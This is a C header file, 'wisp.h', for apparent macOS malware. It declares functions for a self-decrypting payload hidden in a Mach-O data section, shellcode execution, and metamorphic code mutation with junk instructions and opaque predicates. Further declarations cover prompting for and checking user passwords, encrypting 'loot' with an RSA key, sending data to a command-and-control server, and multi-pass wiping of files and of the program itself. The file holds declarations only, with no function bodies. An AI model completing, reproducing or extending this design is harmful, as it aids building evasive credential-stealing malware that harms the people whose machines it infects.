#pragma once
/**
 * @file wisp.h
 */

#ifdef __cplusplus
extern "C" {
#endif

/*----------------------------------------
    C 
----------------------------------------*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

/*----------------------------------------
    System
----------------------------------------*/
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/random.h>
#include <sys/xattr.h>
#include <arpa/inet.h>
#include <libgen.h>
#include <ftw.h>
#include <pwd.h>
#include <uuid/uuid.h>
#include <dlfcn.h>
#include <sys/sysctl.h>

/*----------------------------------------
  macOS Mach-O & Kernel
----------------------------------------*/
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/getsect.h>
#include <mach-o/fat.h>
#include <libkern/OSCacheControl.h>

/*----------------------------------------
  Crypto & Networking
----------------------------------------*/
#include <zlib.h>
#include <curl/curl.h>
#include <CoreFoundation/CoreFoundation.h>

#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/aes.h>

#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>

/*----------------------------------------
  Constants & Macros
----------------------------------------*/
#define KEY_SIZE            32
#define STUB_SIZE           30
#define JUNK_SIZE           16
#define PWD                 256 
#define PAGE_SIZE           4096
#define MAX_FILES           1024

#ifdef TEST
#  define DMB(fmt, ...)    fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#else
#  define DMB(...)         ((void)0)
#endif

#define ROTL32(x,n)         (((x) << (n)) | ((x) >> (32 - (n))))
#define QR(a,b,c,d)         (a += b, d ^= a, d = ROTL32(d,16), \
                             c += d, b ^= c, b = ROTL32(b,12), \
                             a += b, d ^= a, d = ROTL32(d,8),  \
                             c += d, b ^= c, b = ROTL32(b,7))

#define cipher(k,iv,in,out,len)    crypt_payload(1, k, iv, in, out, len)
#define decipher(k,iv,in,out,len)  crypt_payload(0, k, iv, in, out, len)

/*----------------------------------------
  Data Structures
----------------------------------------*/

/**  
 * Header stored in __DATA,__fdata for encrypted payloads.  
 */
typedef struct __attribute__((packed)) {
    uint8_t  key[KEY_SIZE];
    uint8_t  iv[kCCBlockSizeAES128];
    uint64_t seed;
    uint32_t count;
    uint8_t  hash[CC_SHA256_DIGEST_LENGTH];
} encryption_header_t;

/**
 * ChaCha20 PRNG state.
 */
typedef struct {
    uint8_t  key[KEY_SIZE];
    uint8_t  iv[12];
    uint8_t  stream[64];
    size_t   position;
    uint64_t counter;
} chacha_state_t;

/**
 * Collection/bundling.
 */
typedef struct {
    char   *path;
    size_t  size;
} file_object_t;

typedef struct {
    char *path;
    size_t size;
} Object;

/**
 * Wipe.
 */
typedef enum {
    WIPE_ZERO,
    WIPE_ONE,
    WIPE_RANDOM,
    WIPE_CUSTOM
} wipe_pattern_t;

/**
 * Leeloo Dallas mul-ti-pass. Mul-ti-pass.
 */
typedef struct {
    int               passes;
    wipe_pattern_t   *patterns;
    unsigned char     custom;
} wipe_config_t;

/**
 * Generic in-memory buffer for network fetch.
 */
typedef struct {
    char   *data;
    size_t  size;
} MemChh;

/**
 * Function pointer type for sysctl(3) wrapper.
 */
typedef int (*sysctl_func_t)(int *, u_int, void *, size_t *, void *, size_t);

/*----------------------------------------
  Public API
----------------------------------------*/

/* Boot & cook encrypted payload in __DATA,__fdata */
int  boot(uint8_t *section_data, size_t section_size, chacha_state_t *rng);
int  cook(uint8_t *section_data, size_t section_size, chacha_state_t *rng);
void pop_shellcode(uint8_t *code, size_t size);

/* Instruction */
size_t snap_instr_len(const uint8_t *code);
bool   it_op(const uint8_t *code);
bool   it_chunk(const uint8_t *code, size_t max_len);

/* Mutation */
void _mut8(uint8_t *code, size_t size, chacha_state_t *rng);
void swap_instructions(uint8_t *code, size_t size, chacha_state_t *rng);
void insert_junk(uint8_t *code, size_t size, chacha_state_t *rng);
void opaque_predicate(uint8_t *buf, size_t *len, uint32_t value);

/* Encryption & wrapping */
void crypt_payload(int encrypt,
                   const uint8_t *key, const uint8_t *iv,
                   const uint8_t *in,  uint8_t *out,
                   size_t len);
unsigned char *wrap_loot(const unsigned char *plaintext,
                         size_t plaintext_len,
                         size_t *out_len,
                         RSA *rsa_pubkey);

/* Privileges */
char           *execute(const char *command);
void            free_if_not(void *ptr);
char           *extract(const char *output, const char *start_marker, const char *end_marker);
int             auth(const char *username, const char *password);
int             is_user_admin(const char *username);
char           *request_input(const char *prompt_script);
void            request_a(void);

/* collection & wiping */
wipe_config_t *prep_nuker(int passes);
void           burn_config(wipe_config_t *config);
int            self_wipe(const char *path, const wipe_config_t *config);
int            nuke_file(const char *path, const wipe_config_t *config);

/* Network & C2 */
char           *fetch_past(const char *url);
int             from_past(const char *content,
                          char *pubkey_url,
                          char *c2_endpoint);
RSA            *grab_rsa(const char *url);
int             send_to_c2(const char *server_url,
                           const unsigned char *data,
                           size_t size);

/* System */
int             find_self(char *out, uint32_t *size);
void            mint_uuid(char *id);

/* operations */
int             autodes(void);
void            k_ill(void);
__attribute__((noreturn))
void            panic(void);

/* Persistence & profile */
void           update(void);
char           *get_device_id(void);
char           *get_current_user(void);

/* network */
void            build_url(char *buf);
void            http_post(const char *url,
                          const unsigned char *data,
                          size_t size);

#ifdef __cplusplus
}
#endif
